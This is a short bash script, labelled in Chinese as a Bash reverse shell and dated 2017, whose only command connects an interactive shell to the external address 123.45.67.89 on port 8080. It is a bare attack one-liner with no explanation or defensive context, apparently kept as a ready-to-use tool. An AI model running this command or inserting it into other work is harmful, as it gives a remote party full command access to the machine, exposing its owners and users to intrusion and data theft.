#!/bin/bash

# >  desc: 反弹shell Bash版 
# >  author: s0nnet
# >  time: 2017-01-20

bash -i >& /dev/tcp/123.45.67.89/8080 0>&1
